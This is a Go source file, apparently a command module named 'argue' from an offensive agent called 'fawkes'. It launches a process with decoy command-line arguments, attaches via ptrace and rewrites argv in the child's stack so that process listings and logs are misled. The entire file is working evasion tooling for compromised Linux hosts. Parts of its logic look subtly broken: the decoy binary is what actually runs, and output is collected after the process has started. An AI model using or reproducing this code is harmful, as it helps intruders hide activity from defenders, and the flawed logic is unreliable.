//go:build linux

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"

	"fawkes/pkg/structs"
)

type ArgueCommand struct{}

func (c *ArgueCommand) Name() string { return "argue" }
func (c *ArgueCommand) Description() string {
	return "Execute a command with spoofed process arguments"
}

func (c *ArgueCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[argueParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.Command == "" {
		return errorResult("Error: command parameter is required")
	}
	if params.Spoof == "" {
		return errorResult("Error: spoof parameter is required")
	}

	return argueLinux(params)
}

func argueLinux(params argueParams) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("[*] Argument Spoofing (Linux)\n")
	sb.WriteString(fmt.Sprintf("[*] Real command:    %s\n", params.Command))
	sb.WriteString(fmt.Sprintf("[*] Spoofed cmdline: %s\n", params.Spoof))

	realParts := strings.Fields(params.Command)
	if len(realParts) == 0 {
		return errorResult("Error: command is empty")
	}

	spoofParts := strings.Fields(params.Spoof)
	if len(spoofParts) == 0 {
		return errorResult("Error: spoof is empty")
	}

	cmd := exec.Command(spoofParts[0], spoofParts[1:]...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Ptrace: true,
	}

	if err := cmd.Start(); err != nil {
		return errorf("Error starting process: %v", err)
	}

	pid := cmd.Process.Pid
	sb.WriteString(fmt.Sprintf("[+] Spawned PID %d with spoofed args\n", pid))

	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(pid, &ws, syscall.WALL, nil); err != nil {
		return errorf("Wait4 failed: %v", err)
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	stackAddr, stackSize, err := findStackRegion(pid)
	if err != nil {
		_ = syscall.PtraceDetach(pid)
		sb.WriteString(fmt.Sprintf("[!] Could not find stack: %v\n", err))
		sb.WriteString("[*] Detaching — process runs with spoofed args only\n")
		return successResult(sb.String())
	}

	argvAddr, err := findArgvInStack(pid, spoofParts, stackAddr, stackSize)
	if err != nil {
		_ = syscall.PtraceDetach(pid)
		sb.WriteString(fmt.Sprintf("[!] Could not locate argv in stack: %v\n", err))
		sb.WriteString("[*] Detaching — process runs with spoofed args only\n")
		return successResult(sb.String())
	}

	sb.WriteString(fmt.Sprintf("[+] Found argv[0] at 0x%X\n", argvAddr))

	realCmdline := strings.Join(realParts, "\x00") + "\x00"
	spoofCmdline := strings.Join(spoofParts, "\x00") + "\x00"

	if len(realCmdline) > len(spoofCmdline) {
		_ = syscall.PtraceDetach(pid)
		sb.WriteString("[!] Real command is longer than spoof — cannot fit in argv buffer\n")
		sb.WriteString("[*] Tip: make spoof longer than real command with padding\n")
		return successResult(sb.String())
	}

	writeBytes := []byte(realCmdline)
	for len(writeBytes) < len(spoofCmdline) {
		writeBytes = append(writeBytes, 0)
	}

	if _, err := syscall.PtracePokeText(pid, uintptr(argvAddr), writeBytes); err != nil {
		_ = syscall.PtraceDetach(pid)
		sb.WriteString(fmt.Sprintf("[!] PtracePokeText failed: %v\n", err))
		return successResult(sb.String())
	}

	sb.WriteString("[+] Argv overwritten with real command\n")

	if err := syscall.PtraceDetach(pid); err != nil {
		sb.WriteString(fmt.Sprintf("[!] Detach failed: %v\n", err))
	} else {
		sb.WriteString("[+] Detached — process running with real args\n")
	}

	output, _ := cmd.CombinedOutput()
	if len(output) > 0 {
		sb.WriteString("\n--- Output ---\n")
		sb.WriteString(string(output))
	}

	sb.WriteString("[+] Argument spoofing completed\n")
	return successResult(sb.String())
}

func findStackRegion(pid int) (uint64, uint64, error) {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/maps", pid))
	if err != nil {
		return 0, 0, err
	}

	for _, line := range strings.Split(string(data), "\n") {
		if strings.Contains(line, "[stack]") {
			parts := strings.Fields(line)
			if len(parts) < 1 {
				continue
			}
			addrParts := strings.Split(parts[0], "-")
			if len(addrParts) != 2 {
				continue
			}
			var start, end uint64
			fmt.Sscanf(addrParts[0], "%x", &start)
			fmt.Sscanf(addrParts[1], "%x", &end)
			return start, end - start, nil
		}
	}
	return 0, 0, fmt.Errorf("stack region not found")
}

func findArgvInStack(pid int, spoofParts []string, stackAddr, stackSize uint64) (uint64, error) {
	target := []byte(spoofParts[0])
	if len(target) == 0 {
		return 0, fmt.Errorf("empty argv[0]")
	}

	memFile, err := os.Open(fmt.Sprintf("/proc/%d/mem", pid))
	if err != nil {
		return 0, err
	}
	defer memFile.Close()

	buf := make([]byte, stackSize)
	n, err := memFile.ReadAt(buf, int64(stackAddr))
	if err != nil && n == 0 {
		return 0, fmt.Errorf("could not read stack: %v", err)
	}

	for i := 0; i <= n-len(target); i++ {
		match := true
		for j := 0; j < len(target); j++ {
			if buf[i+j] != target[j] {
				match = false
				break
			}
		}
		if match && (i+len(target) >= n || buf[i+len(target)] == 0) {
			return stackAddr + uint64(i), nil
		}
	}

	return 0, fmt.Errorf("argv[0] '%s' not found in stack", spoofParts[0])
}
